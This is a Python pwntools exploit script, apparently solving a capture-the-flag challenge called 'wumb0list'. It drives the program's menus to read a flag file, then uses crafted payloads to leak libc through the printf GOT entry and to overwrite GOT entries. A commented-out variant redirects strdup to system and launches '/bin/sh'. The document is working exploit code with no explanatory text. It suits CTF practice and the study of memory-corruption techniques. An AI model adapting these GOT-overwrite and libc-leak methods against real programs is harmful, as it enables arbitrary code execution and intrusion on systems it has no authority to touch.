#!/usr/bin/python

from pwn import *

e = ELF("./wumb0list")
l = e.libc
p = process(e.path)

raw_input(">>> ")

p.recv()

def catalog_manage():
    p.sendline("1") ; sleep(0.1)
    p.recv()

def catalog_new(cid, name):
    p.sendline("1") ; sleep(0.1)
    p.sendline(str(cid)) ; sleep(0.1)
    p.sendline(name) ; sleep(0.1)
    p.recv()

def catalog_del(cid):
    p.sendline("2") ; sleep(0.1)
    p.sendline(str(cid)) ; sleep(0.1)
    p.recv()

def catalog_import(path):
    p.sendline("4") ; sleep(0.1)
    p.sendline(path) ; sleep(0.1)
    p.recv()

def catalog_back():
    p.sendline("5") ; sleep(0.1)
    p.recv()

def list_manage():
    p.sendline("2") ; sleep(0.1)
    p.recv()

def list_new(name):
    p.sendline("1") ; sleep(0.1)
    p.sendline(name) ; sleep(0.1)
    p.recv()

def list_print(idx):
    p.sendline("4") ; sleep(0.1)
    p.sendline(str(idx)) ; sleep(0.1)
    ret = p.recv()
    print ret
    return ret

def list_set_quantity(idx, cid, quantity):
    p.sendline("7") ; sleep(0.1)
    p.sendline(str(idx)) ; sleep(0.1)
    p.sendline(str(cid)) ; sleep(0.1)
    p.sendline(str(quantity)) ; sleep(0.1)
    p.recv()

def list_back():
    p.sendline("8") ; sleep(0.1)
    p.recv()

catalog_manage()
catalog_import("./flag.txt")
catalog_back()

list_manage()
payload = ""
payload += p64(e.got['printf']) + p64(0x603100-8)
list_new(payload)
leak = list_print(10)
leak = leak[leak.find("List ")+5:]
leak = leak[:leak.find("\n")]
l.address = u64(leak.ljust(8, "\x00")) - l.symbols['printf']
print "libc = 0x%x" % (l.address)

'''
payload = ""
payload += "A"*8 + p64(e.got['strdup']-0x10)
list_new(payload)
list_set_quantity(10, 0x002026aa25ffffff, l.symbols['system'])
list_back()

catalog_manage()
catalog_new(0, "/bin/sh")
'''

payload = "A"*8 + p64(e.got['munmap']-0x10)
list_new(payload)
list_set_quantity(10, 0x002026d225ffffff, l.symbols['puts'])
list_back()

p.interactive()